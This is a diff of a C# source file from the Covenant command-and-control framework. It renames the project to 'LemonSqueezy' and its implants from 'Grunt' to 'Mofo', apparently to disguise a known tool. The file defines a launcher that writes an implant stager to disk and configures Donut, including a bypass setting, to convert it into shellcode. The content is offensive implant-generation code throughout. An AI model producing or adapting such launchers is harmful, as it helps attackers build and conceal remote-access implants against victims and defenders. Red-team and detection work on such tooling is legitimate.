@@ -1,5 +1,5 @@
 ﻿// Author: Ryan Cobb (@cobbr_io)
-// Project: Covenant (https://github.com/cobbr/Covenant)
+// Project: LemonSqueezy (https://github.com/cobbr/LemonSqueezy)
 // License: GNU GPLv3
 
 using System;
@@ -10,35 +10,35 @@ using Microsoft.CodeAnalysis;
 using Donut;
 using Donut.Structs;
 
-using Covenant.Core;
-using Covenant.Models.Listeners;
-using Covenant.Models.Grunts;
+using LemonSqueezy.Core;
+using LemonSqueezy.Models.Listeners;
+using LemonSqueezy.Models.Mofos;
 
-namespace Covenant.Models.Launchers
+namespace LemonSqueezy.Models.Launchers
 {
     public class ShellCodeLauncher : Launcher
     {
         public ShellCodeLauncher()
         {
             this.Type = LauncherType.ShellCode;
-            this.Description = "Converts a Grunt to ShellCode using Donut.";
+            this.Description = "Converts a Mofo to ShellCode using Donut.";
             this.Name = "ShellCode";
             this.OutputKind = OutputKind.ConsoleApplication;
             this.CompressStager = false;
         }
 
-        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Mofo mofo, ImplantTemplate template)
         {
             this.StagerCode = StagerCode;
-            string inputf = Common.CovenantTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".exe");
-            string outputf = Common.CovenantTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".bin");
+            string inputf = Common.LemonSqueezyTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".exe");
+            string outputf = Common.LemonSqueezyTempDirectory + Utilities.GetSanitizedFilename(template.Name + ".bin");
             File.WriteAllBytes(inputf, StagerAssembly);
             DonutConfig config = new DonutConfig
             {
                 Arch = 3,
                 Bypass = 3,
                 InputFile = inputf,
-                Class = "GruntStager",
+                Class = "MofoStager",
                 Method = "Execute",
                 Args = "",
                 Payload = outputf
